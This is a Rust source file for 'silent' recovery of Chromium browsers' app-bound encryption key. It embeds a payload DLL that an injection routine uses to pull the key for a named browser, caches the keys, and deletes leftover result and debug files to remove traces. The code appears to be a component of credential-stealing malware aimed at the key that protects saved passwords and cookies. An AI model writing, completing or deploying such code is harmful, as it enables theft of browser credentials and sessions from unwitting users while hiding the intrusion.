//! Silent Chromium app-bound key recovery (embedded DLL, temp extract, auto cleanup).

use std::{collections::HashMap, path::PathBuf, sync::Mutex};

const EMBEDDED_PAYLOAD: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/payload.dll"));

static KEY_CACHE: Mutex<Option<HashMap<String, Vec<u8>>>> = Mutex::new(None);

pub fn fetch_app_bound_key(browser_name: &str) -> Option<Vec<u8>> {
    if let Ok(guard) = KEY_CACHE.lock() {
        if let Some(map) = guard.as_ref() {
            if let Some(key) = map.get(browser_name) {
                return Some(key.clone());
            }
        }
    }

    let key = inject::recover_key(browser_name, EMBEDDED_PAYLOAD)?;

    if let Ok(mut guard) = KEY_CACHE.lock() {
        if guard.is_none() {
            *guard = Some(HashMap::new());
        }
        if let Some(map) = guard.as_mut() {
            map.insert(browser_name.to_string(), key.clone());
        }
    }

    Some(key)
}

// Legacy cleanup for old runs that wrote to fixed paths.
pub fn cleanup_legacy_artifacts() {
    let legacy = [
        PathBuf::from(r"C:\Users\Public\chrome_recovery_result.json"),
        PathBuf::from(r"C:\Users\Public\cr_debug.log"),
        std::env::temp_dir().join("chrome_recovery_result.json"),
        std::env::temp_dir().join("cr_headless_profile"),
    ];
    for path in legacy {
        if path.is_dir() {
            let _ = std::fs::remove_dir_all(path);
        } else {
            let _ = std::fs::remove_file(path);
        }
    }
}
